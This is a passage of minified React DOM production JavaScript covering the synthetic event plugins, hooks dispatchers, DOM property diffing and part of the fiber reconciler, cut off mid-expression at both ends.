60106,Ma=Q?Symbol.for("react.fragment"):60107,Af=Q?Symbol.for("react.strict_mode"):60108,kc=Q?Symbol.for("react.profiler"):60114,Cf=Q?Symbol.for("react.provider"):60109,Bf=Q?Symbol.for("react.context"):60110,Hj=Q?Symbol.for("react.concurrent_mode"):60111,zd=Q?Symbol.for("react.forward_ref"):60112,lc=Q?Symbol.for("react.suspense"):60113,yd=Q?Symbol.for("react.suspense_list"):60120,Ad=Q?Symbol.for("react.memo"):60115,Ef=Q?Symbol.for("react.lazy"):60116,Df=Q?Symbol.for("react.block"):60121,zf="function"===
typeof Symbol&&Symbol.iterator,od,xh=function(a){return"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(b,c,d,e){MSApp.execUnsafeLocalFunction(function(){return a(b,c,d,e)})}:a}(function(a,b){if("http://www.w3.org/2000/svg"!==a.namespaceURI||"innerHTML"in a)a.innerHTML=b;else{od=od||document.createElement("div");od.innerHTML="<svg>"+b.valueOf().toString()+"</svg>";for(b=od.firstChild;a.firstChild;)a.removeChild(a.firstChild);for(;b.firstChild;)a.appendChild(b.firstChild)}}),Wb=function(a,
b){if(b){var c=a.firstChild;if(c&&c===a.lastChild&&3===c.nodeType){c.nodeValue=b;return}}a.textContent=b},ib={animationend:nc("Animation","AnimationEnd"),animationiteration:nc("Animation","AnimationIteration"),animationstart:nc("Animation","AnimationStart"),transitionend:nc("Transition","TransitionEnd")},Id={},Of={};wa&&(Of=document.createElement("div").style,"AnimationEvent"in window||(delete ib.animationend.animation,delete ib.animationiteration.animation,delete ib.animationstart.animation),"TransitionEvent"in
window||delete ib.transitionend.transition);var $h=oc("animationend"),ai=oc("animationiteration"),bi=oc("animationstart"),ci=oc("transitionend"),Db="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Pf=new ("function"===typeof WeakMap?WeakMap:Map),Ab=null,wi=function(a){if(a){var b=a._dispatchListeners,c=a._dispatchInstances;
if(Array.isArray(b))for(var d=0;d<b.length&&!a.isPropagationStopped();d++)lf(a,b[d],c[d]);else b&&lf(a,b,c);a._dispatchListeners=null;a._dispatchInstances=null;a.isPersistent()||a.constructor.release(a)}},qc=[],Rd=!1,fa=[],xa=null,ya=null,za=null,Eb=new Map,Fb=new Map,Jb=[],Nd="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput close cancel copy cut paste click change contextmenu reset submit".split(" "),
yi="focus blur dragenter dragleave mouseover mouseout pointerover pointerout gotpointercapture lostpointercapture".split(" "),dg={},cg=new Map,Td=new Map,Rj=["abort","abort",$h,"animationEnd",ai,"animationIteration",bi,"animationStart","canplay","canPlay","canplaythrough","canPlayThrough","durationchange","durationChange","emptied","emptied","encrypted","encrypted","ended","ended","error","error","gotpointercapture","gotPointerCapture","load","load","loadeddata","loadedData","loadedmetadata","loadedMetadata",
"loadstart","loadStart","lostpointercapture","lostPointerCapture","playing","playing","progress","progress","seeking","seeking","stalled","stalled","suspend","suspend","timeupdate","timeUpdate",ci,"transitionEnd","waiting","waiting"];Sd("blur blur cancel cancel click click close close contextmenu contextMenu copy copy cut cut auxclick auxClick dblclick doubleClick dragend dragEnd dragstart dragStart drop drop focus focus input input invalid invalid keydown keyDown keypress keyPress keyup keyUp mousedown mouseDown mouseup mouseUp paste paste pause pause play play pointercancel pointerCancel pointerdown pointerDown pointerup pointerUp ratechange rateChange reset reset seeked seeked submit submit touchcancel touchCancel touchend touchEnd touchstart touchStart volumechange volumeChange".split(" "),
0);Sd("drag drag dragenter dragEnter dragexit dragExit dragleave dragLeave dragover dragOver mousemove mouseMove mouseout mouseOut mouseover mouseOver pointermove pointerMove pointerout pointerOut pointerover pointerOver scroll scroll toggle toggle touchmove touchMove wheel wheel".split(" "),1);Sd(Rj,2);(function(a,b){for(var c=0;c<a.length;c++)Td.set(a[c],b)})("change selectionchange textInput compositionstart compositionend compositionupdate".split(" "),0);var Hi=Zh,Gi=Pd,tc=!0,Kb={animationIterationCount:!0,
borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,
strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Sj=["Webkit","ms","Moz","O"];Object.keys(Kb).forEach(function(a){Sj.forEach(function(b){b=b+a.charAt(0).toUpperCase()+a.substring(1);Kb[b]=Kb[a]})});var Ii=M({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0}),ng="$",og="/$",$d="$?",Zd="$!",Ze=null,$e=null,We="function"===typeof setTimeout?setTimeout:void 0,vj="function"===
typeof clearTimeout?clearTimeout:void 0,jf=Math.random().toString(36).slice(2),Aa="__reactInternalInstance$"+jf,vc="__reactEventHandlers$"+jf,Lb="__reactContainere$"+jf,Ba=null,ce=null,wc=null;M(R.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():"unknown"!==typeof a.returnValue&&(a.returnValue=!1),this.isDefaultPrevented=xc)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():"unknown"!==
typeof a.cancelBubble&&(a.cancelBubble=!0),this.isPropagationStopped=xc)},persist:function(){this.isPersistent=xc},isPersistent:yc,destructor:function(){var a=this.constructor.Interface,b;for(b in a)this[b]=null;this.nativeEvent=this._targetInst=this.dispatchConfig=null;this.isPropagationStopped=this.isDefaultPrevented=yc;this._dispatchInstances=this._dispatchListeners=null}});R.Interface={type:null,target:null,currentTarget:function(){return null},eventPhase:null,bubbles:null,cancelable:null,timeStamp:function(a){return a.timeStamp||
Date.now()},defaultPrevented:null,isTrusted:null};R.extend=function(a){function b(){return c.apply(this,arguments)}var c=this,d=function(){};d.prototype=c.prototype;d=new d;M(d,b.prototype);b.prototype=d;b.prototype.constructor=b;b.Interface=M({},c.Interface,a);b.extend=c.extend;sg(b);return b};sg(R);var Tj=R.extend({data:null}),Uj=R.extend({data:null}),Ni=[9,13,27,32],de=wa&&"CompositionEvent"in window,cc=null;wa&&"documentMode"in document&&(cc=document.documentMode);var Vj=wa&&"TextEvent"in window&&
!cc,xg=wa&&(!de||cc&&8<cc&&11>=cc),wg=String.fromCharCode(32),ua={beforeInput:{phasedRegistrationNames:{bubbled:"onBeforeInput",captured:"onBeforeInputCapture"},dependencies:["compositionend","keypress","textInput","paste"]},compositionEnd:{phasedRegistrationNames:{bubbled:"onCompositionEnd",captured:"onCompositionEndCapture"},dependencies:"blur compositionend keydown keypress keyup mousedown".split(" ")},compositionStart:{phasedRegistrationNames:{bubbled:"onCompositionStart",captured:"onCompositionStartCapture"},
dependencies:"blur compositionstart keydown keypress keyup mousedown".split(" ")},compositionUpdate:{phasedRegistrationNames:{bubbled:"onCompositionUpdate",captured:"onCompositionUpdateCapture"},dependencies:"blur compositionupdate keydown keypress keyup mousedown".split(" ")}},vg=!1,mb=!1,Wj={eventTypes:ua,extractEvents:function(a,b,c,d,e){var f;if(de)b:{switch(a){case "compositionstart":var g=ua.compositionStart;break b;case "compositionend":g=ua.compositionEnd;break b;case "compositionupdate":g=
ua.compositionUpdate;break b}g=void 0}else mb?tg(a,c)&&(g=ua.compositionEnd):"keydown"===a&&229===c.keyCode&&(g=ua.compositionStart);g?(xg&&"ko"!==c.locale&&(mb||g!==ua.compositionStart?g===ua.compositionEnd&&mb&&(f=rg()):(Ba=d,ce="value"in Ba?Ba.value:Ba.textContent,mb=!0)),e=Tj.getPooled(g,b,c,d),f?e.data=f:(f=ug(c),null!==f&&(e.data=f)),lb(e),f=e):f=null;(a=Vj?Oi(a,c):Pi(a,c))?(b=Uj.getPooled(ua.beforeInput,b,c,d),b.data=a,lb(b)):b=null;return null===f?b:null===b?f:[f,b]}},Qi={color:!0,date:!0,
datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0},Ag={change:{phasedRegistrationNames:{bubbled:"onChange",captured:"onChangeCapture"},dependencies:"blur change click focus input keydown keyup selectionchange".split(" ")}},Mb=null,Nb=null,kf=!1;wa&&(kf=Tf("input")&&(!document.documentMode||9<document.documentMode));var Xj={eventTypes:Ag,_isInputEventSupported:kf,extractEvents:function(a,b,c,d,e){e=b?Pa(b):window;var f=
e.nodeName&&e.nodeName.toLowerCase();if("select"===f||"input"===f&&"file"===e.type)var g=Si;else if(yg(e))if(kf)g=Wi;else{g=Ui;var h=Ti}else(f=e.nodeName)&&"input"===f.toLowerCase()&&("checkbox"===e.type||"radio"===e.type)&&(g=Vi);if(g&&(g=g(a,b)))return zg(g,c,d);h&&h(a,e,b);"blur"===a&&(a=e._wrapperState)&&a.controlled&&"number"===e.type&&Ed(e,"number",e.value)}},dc=R.extend({view:null,detail:null}),Yi={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"},di=0,ei=0,fi=!1,gi=!1,ec=dc.extend({screenX:null,
screenY:null,clientX:null,clientY:null,pageX:null,pageY:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,getModifierState:fe,button:null,buttons:null,relatedTarget:function(a){return a.relatedTarget||(a.fromElement===a.srcElement?a.toElement:a.fromElement)},movementX:function(a){if("movementX"in a)return a.movementX;var b=di;di=a.screenX;return fi?"mousemove"===a.type?a.screenX-b:0:(fi=!0,0)},movementY:function(a){if("movementY"in a)return a.movementY;var b=ei;ei=a.screenY;return gi?"mousemove"===
a.type?a.screenY-b:0:(gi=!0,0)}}),hi=ec.extend({pointerId:null,width:null,height:null,pressure:null,tangentialPressure:null,tiltX:null,tiltY:null,twist:null,pointerType:null,isPrimary:null}),fc={mouseEnter:{registrationName:"onMouseEnter",dependencies:["mouseout","mouseover"]},mouseLeave:{registrationName:"onMouseLeave",dependencies:["mouseout","mouseover"]},pointerEnter:{registrationName:"onPointerEnter",dependencies:["pointerout","pointerover"]},pointerLeave:{registrationName:"onPointerLeave",dependencies:["pointerout",
"pointerover"]}},Yj={eventTypes:fc,extractEvents:function(a,b,c,d,e){var f="mouseover"===a||"pointerover"===a,g="mouseout"===a||"pointerout"===a;if(f&&0===(e&32)&&(c.relatedTarget||c.fromElement)||!g&&!f)return null;f=d.window===d?d:(f=d.ownerDocument)?f.defaultView||f.parentWindow:window;if(g){if(g=b,b=(b=c.relatedTarget||c.toElement)?Bb(b):null,null!==b){var h=Na(b);if(b!==h||5!==b.tag&&6!==b.tag)b=null}}else g=null;if(g===b)return null;if("mouseout"===a||"mouseover"===a){var m=ec;var n=fc.mouseLeave;
var l=fc.mouseEnter;var k="mouse"}else if("pointerout"===a||"pointerover"===a)m=hi,n=fc.pointerLeave,l=fc.pointerEnter,k="pointer";a=null==g?f:Pa(g);f=null==b?f:Pa(b);n=m.getPooled(n,g,c,d);n.type=k+"leave";n.target=a;n.relatedTarget=f;c=m.getPooled(l,b,c,d);c.type=k+"enter";c.target=f;c.relatedTarget=a;d=g;k=b;if(d&&k)a:{m=d;l=k;g=0;for(a=m;a;a=pa(a))g++;a=0;for(b=l;b;b=pa(b))a++;for(;0<g-a;)m=pa(m),g--;for(;0<a-g;)l=pa(l),a--;for(;g--;){if(m===l||m===l.alternate)break a;m=pa(m);l=pa(l)}m=null}else m=
null;l=m;for(m=[];d&&d!==l;){g=d.alternate;if(null!==g&&g===l)break;m.push(d);d=pa(d)}for(d=[];k&&k!==l;){g=k.alternate;if(null!==g&&g===l)break;d.push(k);k=pa(k)}for(k=0;k<m.length;k++)be(m[k],"bubbled",n);for(k=d.length;0<k--;)be(d[k],"captured",c);return 0===(e&64)?[n]:[n,c]}},Qa="function"===typeof Object.is?Object.is:Zi,$i=Object.prototype.hasOwnProperty,Zj=wa&&"documentMode"in document&&11>=document.documentMode,Eg={select:{phasedRegistrationNames:{bubbled:"onSelect",captured:"onSelectCapture"},
dependencies:"blur contextmenu dragend focus keydown keyup mousedown mouseup selectionchange".split(" ")}},nb=null,he=null,Pb=null,ge=!1,ak={eventTypes:Eg,extractEvents:function(a,b,c,d,e,f){e=f||(d.window===d?d.document:9===d.nodeType?d:d.ownerDocument);if(!(f=!e)){a:{e=Jd(e);f=rd.onSelect;for(var g=0;g<f.length;g++)if(!e.has(f[g])){e=!1;break a}e=!0}f=!e}if(f)return null;e=b?Pa(b):window;switch(a){case "focus":if(yg(e)||"true"===e.contentEditable)nb=e,he=b,Pb=null;break;case "blur":Pb=he=nb=null;
break;case "mousedown":ge=!0;break;case "contextmenu":case "mouseup":case "dragend":return ge=!1,Dg(c,d);case "selectionchange":if(Zj)break;case "keydown":case "keyup":return Dg(c,d)}return null}},bk=R.extend({animationName:null,elapsedTime:null,pseudoElement:null}),ck=R.extend({clipboardData:function(a){return"clipboardData"in a?a.clipboardData:window.clipboardData}}),dk=dc.extend({relatedTarget:null}),ek={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",
Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},fk={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",
224:"Meta"},gk=dc.extend({key:function(a){if(a.key){var b=ek[a.key]||a.key;if("Unidentified"!==b)return b}return"keypress"===a.type?(a=Ac(a),13===a?"Enter":String.fromCharCode(a)):"keydown"===a.type||"keyup"===a.type?fk[a.keyCode]||"Unidentified":""},location:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,repeat:null,locale:null,getModifierState:fe,charCode:function(a){return"keypress"===a.type?Ac(a):0},keyCode:function(a){return"keydown"===a.type||"keyup"===a.type?a.keyCode:0},which:function(a){return"keypress"===
a.type?Ac(a):"keydown"===a.type||"keyup"===a.type?a.keyCode:0}}),hk=ec.extend({dataTransfer:null}),ik=dc.extend({touches:null,targetTouches:null,changedTouches:null,altKey:null,metaKey:null,ctrlKey:null,shiftKey:null,getModifierState:fe}),jk=R.extend({propertyName:null,elapsedTime:null,pseudoElement:null}),kk=ec.extend({deltaX:function(a){return"deltaX"in a?a.deltaX:"wheelDeltaX"in a?-a.wheelDeltaX:0},deltaY:function(a){return"deltaY"in a?a.deltaY:"wheelDeltaY"in a?-a.wheelDeltaY:"wheelDelta"in a?
-a.wheelDelta:0},deltaZ:null,deltaMode:null}),lk={eventTypes:dg,extractEvents:function(a,b,c,d,e){e=cg.get(a);if(!e)return null;switch(a){case "keypress":if(0===Ac(c))return null;case "keydown":case "keyup":a=gk;break;case "blur":case "focus":a=dk;break;case "click":if(2===c.button)return null;case "auxclick":case "dblclick":case "mousedown":case "mousemove":case "mouseup":case "mouseout":case "mouseover":case "contextmenu":a=ec;break;case "drag":case "dragend":case "dragenter":case "dragexit":case "dragleave":case "dragover":case "dragstart":case "drop":a=
hk;break;case "touchcancel":case "touchend":case "touchmove":case "touchstart":a=ik;break;case $h:case ai:case bi:a=bk;break;case ci:a=jk;break;case "scroll":a=dc;break;case "wheel":a=kk;break;case "copy":case "cut":case "paste":a=ck;break;case "gotpointercapture":case "lostpointercapture":case "pointercancel":case "pointerdown":case "pointermove":case "pointerout":case "pointerover":case "pointerup":a=hi;break;default:a=R}b=a.getPooled(e,b,c,d);lb(b);return b}};(function(a){if(ic)throw Error(k(101));
ic=Array.prototype.slice.call(a);nf()})("ResponderEventPlugin SimpleEventPlugin EnterLeaveEventPlugin ChangeEventPlugin SelectEventPlugin BeforeInputEventPlugin".split(" "));(function(a,b,c){td=a;rf=b;mf=c})(ae,Hb,Pa);pf({SimpleEventPlugin:lk,EnterLeaveEventPlugin:Yj,ChangeEventPlugin:Xj,SelectEventPlugin:ak,BeforeInputEventPlugin:Wj});var ie=[],ob=-1,Ca={},B={current:Ca},G={current:!1},Ra=Ca,bj=Pd,je=$f,Rg=Lj,aj=Nj,Dc=Oj,Ig=Zh,Jg=ag,Kg=Pj,Lg=Qj,Qg={},yj=Mj,Cj=void 0!==Yh?Yh:function(){},qa=null,
Ec=null,ke=!1,ii=ff(),Y=1E4>ii?ff:function(){return ff()-ii},Ic={current:null},Hc=null,qb=null,Gc=null,Tg=0,Jc=2,Ga=!1,Vb=da.ReactCurrentBatchConfig,$g=(new ea.Component).refs,Mc={isMounted:function(a){return(a=a._reactInternalFiber)?Na(a)===a:!1},enqueueSetState:function(a,b,c){a=a._reactInternalFiber;var d=ka(),e=Vb.suspense;d=Va(d,a,e);e=Ea(d,e);e.payload=b;void 0!==c&&null!==c&&(e.callback=c);Fa(a,e);Ja(a,d)},enqueueReplaceState:function(a,b,c){a=a._reactInternalFiber;var d=ka(),e=Vb.suspense;
d=Va(d,a,e);e=Ea(d,e);e.tag=1;e.payload=b;void 0!==c&&null!==c&&(e.callback=c);Fa(a,e);Ja(a,d)},enqueueForceUpdate:function(a,b){a=a._reactInternalFiber;var c=ka(),d=Vb.suspense;c=Va(c,a,d);d=Ea(c,d);d.tag=Jc;void 0!==b&&null!==b&&(d.callback=b);Fa(a,d);Ja(a,c)}},Qc=Array.isArray,wb=ah(!0),Fe=ah(!1),Sb={},ja={current:Sb},Ub={current:Sb},Tb={current:Sb},D={current:0},Sc=da.ReactCurrentDispatcher,X=da.ReactCurrentBatchConfig,Ia=0,z=null,K=null,J=null,Uc=!1,Tc={readContext:W,useCallback:S,useContext:S,
useEffect:S,useImperativeHandle:S,useLayoutEffect:S,useMemo:S,useReducer:S,useRef:S,useState:S,useDebugValue:S,useResponder:S,useDeferredValue:S,useTransition:S},dj={readContext:W,useCallback:ih,useContext:W,useEffect:eh,useImperativeHandle:function(a,b,c){c=null!==c&&void 0!==c?c.concat([a]):null;return ze(4,2,gh.bind(null,b,a),c)},useLayoutEffect:function(a,b){return ze(4,2,a,b)},useMemo:function(a,b){var c=ub();b=void 0===b?null:b;a=a();c.memoizedState=[a,b];return a},useReducer:function(a,b,c){var d=
ub();b=void 0!==c?c(b):b;d.memoizedState=d.baseState=b;a=d.queue={pending:null,dispatch:null,lastRenderedReducer:a,lastRenderedState:b};a=a.dispatch=ch.bind(null,z,a);return[d.memoizedState,a]},useRef:function(a){var b=ub();a={current:a};return b.memoizedState=a},useState:xe,useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=xe(a),d=c[0],e=c[1];eh(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=
xe(!1),c=b[0];b=b[1];return[ih(Ce.bind(null,b,a),[b,a]),c]}},ej={readContext:W,useCallback:Yc,useContext:W,useEffect:Xc,useImperativeHandle:hh,useLayoutEffect:fh,useMemo:jh,useReducer:Vc,useRef:dh,useState:function(a){return Vc(Ua)},useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=Vc(Ua),d=c[0],e=c[1];Xc(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=Vc(Ua),c=b[0];b=b[1];return[Yc(Ce.bind(null,
b,a),[b,a]),c]}},fj={readContext:W,useCallback:Yc,useContext:W,useEffect:Xc,useImperativeHandle:hh,useLayoutEffect:fh,useMemo:jh,useReducer:Wc,useRef:dh,useState:function(a){return Wc(Ua)},useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=Wc(Ua),d=c[0],e=c[1];Xc(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=Wc(Ua),c=b[0];b=b[1];return[Yc(Ce.bind(null,b,a),[b,a]),c]}},ra=null,Ka=null,Wa=
!1,gj=da.ReactCurrentOwner,ia=!1,Je={dehydrated:null,retryTime:0};var jj=function(a,b,c,d){for(c=b.child;null!==c;){if(5===c.tag||6===c.tag)a.appendChild(c.stateNode);else if(4!==c.tag&&null!==c.child){c.child.return=c;c=c.child;continue}if(c===b)break;for(;null===c.sibling;){if(null===c.return||c.return===b)return;c=c.return}c.sibling.return=c.return;c=c.sibling}};var wh=function(a){};var ij=function(a,b,c,d,e){var f=a.memoizedProps;if(f!==d){var g=b.stateNode;Ta(ja.current);a=null;switch(c){case "input":f=
Cd(g,f);d=Cd(g,d);a=[];break;case "option":f=Fd(g,f);d=Fd(g,d);a=[];break;case "select":f=M({},f,{value:void 0});d=M({},d,{value:void 0});a=[];break;case "textarea":f=Gd(g,f);d=Gd(g,d);a=[];break;default:"function"!==typeof f.onClick&&"function"===typeof d.onClick&&(g.onclick=uc)}Ud(c,d);var h,m;c=null;for(h in f)if(!d.hasOwnProperty(h)&&f.hasOwnProperty(h)&&null!=f[h])if("style"===h)for(m in g=f[h],g)g.hasOwnProperty(m)&&(c||(c={}),c[m]="");else"dangerouslySetInnerHTML"!==h&&"children"!==h&&"suppressContentEditableWarning"!==
h&&"suppressHydrationWarning"!==h&&"autoFocus"!==h&&(db.hasOwnProperty(h)?a||(a=[]):(a=a||[]).push(h,null));for(h in d){var k=d[h];g=null!=f?f[h]:void 0;if(d.hasOwnProperty(h)&&k!==g&&(null!=k||null!=g))if("style"===h)if(g){for(m in g)!g.hasOwnProperty(m)||k&&k.hasOwnProperty(m)||(c||(c={}),c[m]="");for(m in k)k.hasOwnProperty(m)&&g[m]!==k[m]&&(c||(c={}),c[m]=k[m])}else c||(a||(a=[]),a.push(h,c)),c=k;else"dangerouslySetInnerHTML"===h?(k=k?k.__html:void 0,g=g?g.__html:void 0,null!=k&&g!==k&&(a=a||
[]).push(h,k)):"children"===h?g===k||"string"!==typeof k&&"number"!==typeof k||(a=a||[]).push(h,""+k):"suppressContentEditableWarning"!==h&&"suppressHydrationWarning"!==h&&(db.hasOwnProperty(h)?(null!=k&&oa(e,h),a||g===k||(a=[])):(a=a||[]).push(h,k))}c&&(a=a||[]).push("style",c);e=a;if(b.updateQueue=e)b.effectTag|=4}};var kj=function(a,b,c,d){c!==d&&(b.effectTag|=4)};var pj="function"===typeof WeakSet?WeakSet:Set,wj="function"===typeof WeakMap?WeakMap:Map,sj=Math.ceil,gd=da.ReactCurrentDispatcher,
Uh=da.ReactCurrentOwner,H=0,Ye=8,ca=16,ma=32,Xa=0,hd=1,Oh=2,ad=3,bd=4,Xe=5,p=H,U=null,t=null,P=0,F=Xa,id=null,ta=1073741823,Yb=1073741823,kd=null,Xb=0,jd=!1,Re=0,Ph=500,l=null,cd=!1,Se=null,La=null,ld=!1,Zb=null,$b=90,bb=null,ac=0,af=null,dd=0,Ja=function(a,b){if(50<ac)throw ac=0,af=null,Error(k(185));a=ed(a,b);if(null!==a){var c=Cc();1073741823===b?(p&Ye)!==H&&(p&(ca|ma))===H?Te(a):(V(a),p===H&&ha()):V(a);(p&4)===H||98!==c&&99!==c||(null===bb?bb=new Map([[a,b]]):(c=bb.get(a),(void 0===c||c>b)&&bb.set(a,
b)))}};var zj=function(a,b,c){var d=b.expirationTime;if(null!==a){var e=b.pendingProps;if(a.memoizedProps!==e||G.current)ia=!0;else{if(d<c){ia=!1;switch(b.tag){case 3:sh(b);Ee();break;case 5:bh(b);if(b.mode&4&&1!==c&&e.hidden)return b.expirationTime=b.childExpirationTime=1,null;break;case 1:N(b.type)&&Bc(b);break;case 4:se(b,b.stateNode.containerInfo);break;case 10:d=b.memoizedProps.value;e=b.type._context;y(Ic,e._currentValue);e._currentValue=d;break;case 13:if(null!==b.memoizedState){d=b.child.childExpirationTime;
if(0!==d&&d>=c)return th(a,b,c);y(D,D.current&1);b=sa(a,b,c);return null!==b?b.sibling:null}y(D,D.current&1);break;case 19:d=b.childExpirationTime>=c;if(0!==(a.effectTag&64)){if(d)return vh(a,b,c);b.effectTag|=64}e=b.memoizedState;null!==e&&(e.rendering=null,e.tail=null);y(D,D.current);if(!d)return null}return sa(a,b,c)}ia=!1}}else ia=!1;b.expirationTime=0;switch(b.tag){case 2:d=b.type;null!==a&&(a.alternate=null,b.alternate=null,b.effectTag|=2);a=b.pendingProps;e=pb(b,B.current);rb(b,c);e=we(null,
b,d,a,e,c);b.effectTag|=1;if("object"===typeof e&&null!==e&&"function"===typeof e.render&&void 0===e.$$typeof){b.tag=1;b.memoizedState=null;b.updateQueue=null;if(N(d)){var f=!0;Bc(b)}else f=!1;b.memoizedState=null!==e.state&&void 0!==e.state?e.state:null;ne(b);var g=d.getDerivedStateFromProps;"function"===typeof g&&Lc(b,d,g,a);e.updater=Mc;b.stateNode=e;e._reactInternalFiber=b;pe(b,d,a,c);b=Ie(null,b,d,!0,f,c)}else b.tag=0,T(null,b,e,c),b=b.child;return b;case 16:a:{e=b.elementType;null!==a&&(a.alternate=
null,b.alternate=null,b.effectTag|=2);a=b.pendingProps;ri(e);if(1!==e._status)throw e._result;e=e._result;b.type=e;f=b.tag=Gj(e);a=aa(e,a);switch(f){case 0:b=He(null,b,e,a,c);break a;case 1:b=rh(null,b,e,a,c);break a;case 11:b=nh(null,b,e,a,c);break a;case 14:b=oh(null,b,e,aa(e.type,a),d,c);break a}throw Error(k(306,e,""));}return b;case 0:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),He(a,b,d,e,c);case 1:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),rh(a,b,d,e,c);
case 3:sh(b);d=b.updateQueue;if(null===a||null===d)throw Error(k(282));d=b.pendingProps;e=b.memoizedState;e=null!==e?e.element:null;oe(a,b);Qb(b,d,null,c);d=b.memoizedState.element;if(d===e)Ee(),b=sa(a,b,c);else{if(e=b.stateNode.hydrate)Ka=kb(b.stateNode.containerInfo.firstChild),ra=b,e=Wa=!0;if(e)for(c=Fe(b,null,d,c),b.child=c;c;)c.effectTag=c.effectTag&-3|1024,c=c.sibling;else T(a,b,d,c),Ee();b=b.child}return b;case 5:return bh(b),null===a&&De(b),d=b.type,e=b.pendingProps,f=null!==a?a.memoizedProps:
null,g=e.children,Yd(d,e)?g=null:null!==f&&Yd(d,f)&&(b.effectTag|=16),qh(a,b),b.mode&4&&1!==c&&e.hidden?(b.expirationTime=b.childExpirationTime=1,b=null):(T(a,b,g,c),b=b.child),b;case 6:return null===a&&De(b),null;case 13:return th(a,b,c);case 4:return se(b,b.stateNode.containerInfo),d=b.pendingProps,null===a?b.child=wb(b,null,d,c):T(a,b,d,c),b.child;case 11:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),nh(a,b,d,e,c);case 7:return T(a,b,b.pendingProps,c),b.child;case 8:return T(a,
b,b.pendingProps.children,c),b.child;case 12:return T(a,b,b.pendingProps.children,c),b.child;case 10:a:{d=b.type._context;e=b.pendingProps;g=b.memoizedProps;f=e.value;var h=b.type._context;y(Ic,h._currentValue);h._currentValue=f;if(null!==g)if(h=g.value,f=Qa(h,f)?0:("function"===typeof d._calculateChangedBits?d._calculateChangedBits(h,f):1073741823)|0,0===f){if(g.children===e.children&&!G.current){b=sa(a,b,c);break a}}else for(h=b.child,null!==h&&(h.return=b);null!==h;){var m=h.dependencies;if(null!==
m){g=h.child;for(var l=m.firstContext;null!==l;){if(l.context===d&&0!==(l.observedBits&f)){1===h.tag&&(l=Ea(c,null),l.tag=Jc,Fa(h,l));h.expirationTime<c&&(h.expirationTime=c);l=h.alternate;null!==l&&l.expirationTime<c&&(l.expirationTime=c);Sg(h.return,c);m.expirationTime<c&&(m.expirationTime=c);break}l=l.next}}else g=10===h.tag?h.type===b.type?null:h.child:h.child;if(null!==g)g.return=h;else for(g=h;null!==g;){if(g===b){g=null;break}h=g.sibling;if(null!==h){h.return=g.return;g=h;break}g=g.return}h=
g}T(a,b,e.children,c);b=b.child}return b;case 9:return e=b.type,f=b.pendingProps,d=f.children,rb(b,c),e=W(e,f.unstable_observedBits),d=d(e),b.effectTag|=1,T(a,b,d,c),b.child;case 14:return e=b.type,f=aa(e,b.pendingProps),f=aa(e.type,f),oh(a,b,e,f,d,c);case 15:return ph(a,b,b.type,b.pendingProps,d,c);case 17:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),null!==a&&(a.alternate=null,b.alternate=null,b.effectTag|=2),b.tag=1,N(d)?(a=!0,Bc(b)):a=!1,rb(b,c),Yg(b,d,e),pe(b,d,e,c),Ie(null,
